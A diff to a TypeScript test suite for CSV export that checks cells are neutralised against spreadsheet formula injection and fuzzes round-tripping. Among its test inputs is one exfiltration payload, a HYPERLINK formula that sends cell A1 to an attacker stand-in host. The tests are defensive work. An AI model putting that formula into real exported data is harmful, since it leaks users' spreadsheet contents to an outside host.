@@ -41,6 +41,13 @@ describe('E4: the cross-tab warning is rate-limited instead of stacking', () => 
 });
 
 describe('D4: an exported cell cannot become a live spreadsheet formula', () => {
+  /** The text a spreadsheet sees: the cell with its CSV quoting removed. */
+  const exportedText = (v: string) => {
+    const cell = csvCell(v);
+    return cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
+  };
+  const isSafeInSpreadsheet = (s: string) => s.startsWith("'") || !/^[=+\-@\t\r]/.test(s);
+
   it.each([
     '=HYPERLINK("http://evil.example/?"&A1,"click")',
     '=1+1',
@@ -50,12 +57,20 @@ describe('D4: an exported cell cannot become a live spreadsheet formula', () => 
     '\tcmd',
     '\rcmd',
   ])('neutralises %j', (value) => {
-    // The guard is an apostrophe immediately before the formula character. Comparing against the
-    // literal value does not work once the value contains a quote, because CSV then doubles every
-    // one of them — so compare against the same escaping csvCell applies.
-    const cell = csvCell(value);
-    const escaped = value.replace(/"/g, '""');
-    expect(cell.includes(`'${escaped}`)).toBe(true);
+    // What must hold is the property, not the mechanism: the text a spreadsheet sees does not begin
+    // with a formula character. Read back through the same escaping the writer applies, because
+    // quoting changes the first character of the raw value.
+    expect(isSafeInSpreadsheet(exportedText(value))).toBe(true);
+  });
+
+  it('guards a formula that a leading space or tab was hiding, and trims the space or tab away', () => {
+    // The importer trims every field before it strips the guard, so the writer trims too — otherwise
+    // the two ends disagree about where the guard belongs. A leading tab is therefore removed rather
+    // than guarded: the cell no longer leads with a tab, so there is nothing for it to lead.
+    expect(exportedText('\t=1+1')).toBe("'=1+1");
+    expect(exportedText('  =1+1')).toBe("'=1+1");
+    expect(exportedText('\tcmd')).toBe('cmd');
+    expect(exportedText('\rcmd')).toBe('cmd');
   });
 
   it('leaves ordinary text, numbers and an empty cell alone', () => {
@@ -147,6 +162,39 @@ describe('E3: the guard covers the header row, and a literal quote survives', ()
   it('a header value the user typed with a leading quote also round-trips', () => {
     const headers = ["'=qty", 'Name'];
     expect(parseCSV(toCSV(headers, [] as never)).headers).toEqual(headers);
+  });
+
+  it('round-trips every value a fuzzer over guard-sensitive characters can build', () => {
+    // The v1.0.24 review fuzzed this and found 40 mismatches in 5756 cases, all of one shape: a
+    // space or newline BEFORE the apostrophe, e.g. " '-5" coming back as "-5". The importer trims
+    // each field before it strips the guard, and the guard was being decided on the untrimmed value.
+    const alphabet = ["'", '=', '+', '-', '@', 'a', '1', ',', '"', '\n', ' ', '\t'];
+    let seed = 20261006;
+    const rnd = () => (seed = (seed * 1103515245 + 12345) & 0x7fffffff) / 0x7fffffff;
+    const cases: string[] = [];
+    for (let n = 0; n < 3000; n++) {
+      let s = '';
+      const len = 1 + Math.floor(rnd() * 4);
+      for (let i = 0; i < len; i++) s += alphabet[Math.floor(rnd() * alphabet.length)];
+      cases.push(s);
+    }
+
+    const valueMismatches: string[] = [];
+    const headerMismatches: string[] = [];
+    for (const v of cases) {
+      // The parser trims every field, so the trimmed value is the contract at both ends.
+      const csv = toCSV(['h'], [{ h: v }] as never);
+      const parsed = parseCSV(csv);
+      const back = parsed.records[0]?.h;
+      if (parsed.records.length !== 1 || back !== v.trim()) {
+        valueMismatches.push(`${JSON.stringify(v)} -> ${JSON.stringify(back)} via ${JSON.stringify(csv)} (${parsed.records.length} rows)`);
+      }
+      if (!v.trim()) continue;   // a header that trims to nothing is not a header; parseCSV rejects a file with none
+      const [header] = parseCSV(toCSV([v], [] as never)).headers;
+      if (header !== v.trim()) headerMismatches.push(`${JSON.stringify(v)} -> ${JSON.stringify(header)}`);
+    }
+    expect(valueMismatches.slice(0, 5)).toEqual([]);
+    expect(headerMismatches.slice(0, 5)).toEqual([]);
   });
 });
 
